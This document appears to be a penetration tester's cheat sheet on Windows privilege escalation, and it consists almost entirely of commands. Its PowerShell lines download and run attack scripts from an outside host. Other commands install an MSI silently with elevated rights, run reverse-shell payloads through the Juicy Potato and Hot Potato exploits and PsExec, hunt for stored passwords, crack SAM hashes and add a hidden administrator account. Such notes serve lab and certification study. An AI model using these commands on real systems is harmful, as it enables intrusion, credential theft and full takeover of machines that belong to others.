# Privilege Escalation - Windows
---

## Automated Information Gathering Tools

### winPEAS
```bat
.\winPEASany.bat quiet cmd fast
.\winPEASany.bat quiet servicesinfo
.\winPEASany.bat quiet applicationsinfo
```

### windows-privesc-checker
```bat
.\windows-privesc-check2.exe
```
[project](https://github.com/pentestmonkey/windows-privesc-check)

### powerup.ps1
```ps1
IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/PowerUp.ps1')
```
[project](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

### sherlock
runs checks against OS patches
```ps1
IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/Sherlock.ps1')
```
[project](https://github.com/rasta-mouse/Sherlock)

### watson (newer sherlock for new OS's)
```bat
.\watson.exe
```
[project](https://github.com/rasta-mouse/Watson)

### windows-exploit-suggester
```py
./windows-exploit-suggester.py --systeminfo win7sp1-systeminfo.txt
```
[project](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

----

## Manual Information Gathering

### systeminfo
```bat
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### user info
```bat
net user
net user <username>
net accounts
whoami /group
whoami /priv
whoami /all
```

### mounted volumes
```bat
mountvol
```

### service querying
```bat
sc.exe qc <name>
sc.exe query <name>
sc.exe config <name> <option>= <value> (note space)
net start/stop <name>

sc config <name> depend= / to clear dependencies
```

### msi install as administrator
```bat
.\winPEASany.exe quiet windowscreds

> reg query
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
/v AlwaysInstallElevated

> reg query
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
/v AlwaysInstallElevated

msiexec /quiet /qn /i reverse.msi
```

### hidden files
```bat
dir C: /a:h /b /s
```

### saved credentials
```bat
.\winPEASany.exe quiet cmd windowscreds

cmdkey /list

runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

#### Invoke-RunAs

- transfer over file via IEX
```ps1
Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1
```
[fuzzysecurity](https://github.com/FuzzySecurity/PowerShell-Suite)

### passwords search
```bat
.\winPEASany.exe quiet filesinfo userinfo

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

dir /s *pass* == *.config

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

```

### unattend.xml locations
```bat
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### SAM locations
- C:\Windows\System32\config
- C:\Windows\Repair
- C:\Windows\System32\config\RegBack


```sh
python2 creddump7/pwdump.py SYSTEM SAM

hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da
/usr/share/wordlists/rockyou.txt
```
[pwdump](https://github.com/Neohapsis/creddump7.git)

### scheduled tasks
```bat
schtasks /query /fo LIST /v
```
```ps1
Get-ScheduledTask | where {$_.TaskPath -notlike
"\Microsoft*"} | ft TaskName,TaskPath,State
```
### startup apps
```bat
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Star
t Menu\Programs\StartUp

.\winPEASany.exe quiet applicationsinfo

reg query
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

.\accesschk.exe /accepteula -wvu "C:\Program
Files\Autorun Program\program.exe"
```

### windows defender status
```ps1
Get-MpComputerStatus
```

### firewall status
```bat
netsh firewall show state
netsh firewall show config
```

### network shares
```bat
net share
```

### installed apps
```bat
tasklist /v
.\seatbelt.exe NonstandardProcesses
.\winPEASany.exe quiet procesinfo
```
---
## Exploits

### Hot Potato
```bat
.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

### Juicy Potato
- need **SEImpersonate** OR **SEAssignPrimaryToken**
- port 1337 must be available (netstat -ano)

```bat
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d49b8-abc6-03dd84127020}

.\juicy.exe -l 1337 -p reverse.exe -t * (will use default -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}))
```
- ensure reverse shell payload is right arch

[more cslids](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)</br>
[x64-juicy-potato](https://github.com/ohpe/juicy-potato)</br>
[x86-juicy-potato](https://github.com/ivanitlearning/Juicy-Potato-x86)</br>

---

## Miscellaneous

### port forwarding

```bat
plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>
```
### rdp - add user
```bat
net user <username> <password> /add
net localgroup administrators <username> /add
```

## PsExec
```bat
.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
.\PsExec.exe -accepteula -u alice -p aliceishere reverse.exe
```

## Powershell - Check Arch
```ps1
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess
```

---

## Credits
[PayloadAllTheThings - Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)</br>
[Tib3rius Windows Privilege Escalation - Udemy](https://www.udemy.com/course/windows-privilege-escalation/)</br>
